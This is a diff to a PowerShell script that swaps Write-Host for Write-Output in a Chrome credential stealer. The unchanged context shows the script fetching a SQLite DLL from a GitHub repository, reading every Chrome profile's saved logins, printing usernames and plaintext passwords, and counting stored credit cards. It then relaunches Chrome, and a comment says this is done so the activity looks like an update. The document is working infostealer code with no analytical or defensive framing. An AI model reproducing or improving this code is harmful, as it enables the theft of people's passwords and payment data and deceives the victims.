@@ -16,12 +16,12 @@ if(-not (Test-Path "C:\Program Files\PowerShell\7")){
     [System.Environment]::SetEnvironmentVariable("Path", $env:Path + ";C:\Program Files\PowerShell\7", [System.EnvironmentVariableTarget]::Machine) #potentialy optional
 }
 else{
-Write-Host "Powershell 7 is already installed"
+Write-Output "Powershell 7 is already installed"
 }
 
 #check if the sql dll is installed
 if(Test-Path "C:\Users\$env:USERNAME\System.Data.SQLite.dll"){
-Write-Host "the dll for sql are already installed"
+Write-Output "the dll for sql are already installed"
 }
 else{#install sql dll
 Invoke-WebRequest -Uri "https://github.com/Desnyt628/download/raw/refs/heads/main/System.Data.SQLite.dll" -OutFile "C:\Users\$env:USERNAME\System.Data.SQLite.dll" #modifier laddress pour trouver le dll de sql
@@ -180,15 +180,15 @@ function password {
             if($showoutput){
          
                 # Output the results
-                Write-Host "`r`naccount #$i"
+                Write-Output "`r`naccount #$i"
                         if($errorOccurred){
-                write-host "no real account associated"
+                Write-Output "no real account associated"
                 }
-                Write-Host "URL_Origin: $urlOrigine"
-                Write-Host "URL_Action: $urlAction"
-                Write-Host "Username: $username"
-                Write-Host "Password: $passwordPlainText"
-                Write-Host "----------------------------"
+                Write-Output "URL_Origin: $urlOrigine"
+                Write-Output "URL_Action: $urlAction"
+                Write-Output "Username: $username"
+                Write-Output "Password: $passwordPlainText"
+                Write-Output "----------------------------"
 
             }
         }
@@ -196,7 +196,7 @@ function password {
         $connection.Close()
         
         $passwordfound.Value =$chrome_found
-        Write-Host "$chrome_found Password found for this user`r`n--------------------------------------------------------"
+        Write-Output "$chrome_found Password found for this user`r`n--------------------------------------------------------"
     }
 }
 
@@ -307,15 +307,15 @@ password -pathToLog "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Dat
     if(-not($creditInfo -eq "no credit card found for this account")){
         $nbCreditCard+=$creditInfo.Length
         $creditlenght=$creditInfo.Length
-        write-host "`r`n$creditlenght credit card found for this user`r`n--------------------------------------------------------"
+        Write-Output "`r`n$creditlenght credit card found for this user`r`n--------------------------------------------------------"
     }
     else{
-    write-host "no credit card found for this user`r`n--------------------------------------------------------"
+    Write-Output "no credit card found for this user`r`n--------------------------------------------------------"
     }
     if($email -eq $null){
     $email="no mail account associated"
     }
-    Write-Host "end of account for $email`r`n--------------------------------------------------------`r`n--------------------------------------------------------"
+    Write-Output "end of account for $email`r`n--------------------------------------------------------`r`n--------------------------------------------------------"
 $pwTotal+=$passwordfound
 $profileNB = 1
 
@@ -347,21 +347,21 @@ while(Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile $profileNB\Lo
     if(-not($creditInfo -eq "no credit card found for this account")){
         $nbCreditCard+=$creditInfo.Length
         $creditlenght=$creditInfo.Length
-        write-host "`r`n$creditlenght credit card found for this user`r`n--------------------------------------------------------"
+        Write-Output "`r`n$creditlenght credit card found for this user`r`n--------------------------------------------------------"
     }
     else{
-    write-host "no credit card found for this user`r`n--------------------------------------------------------"
+    Write-Output "no credit card found for this user`r`n--------------------------------------------------------"
     }
 
     if($email -eq $null){
     $email="no mail account associated"
     }
 
-    Write-Host "end of account for $email`r`n--------------------------------------------------------`r`n--------------------------------------------------------"
+    Write-Output "end of account for $email`r`n--------------------------------------------------------`r`n--------------------------------------------------------"
 
     $pwTotal+=$passwordfound
     $profileNB++
 }
 Start-Process "chrome.exe"#restart chrome so it seems like an update or somthing like that 
-Write-Host "password total=$pwTotal `r`nnumber of profile:$profileNB `r`nnumber of credit card found: $nbCreditCard"
+Write-Output "password total=$pwTotal `r`nnumber of profile:$profileNB `r`nnumber of credit card found: $nbCreditCard"
 #says the total of account and the total of password found
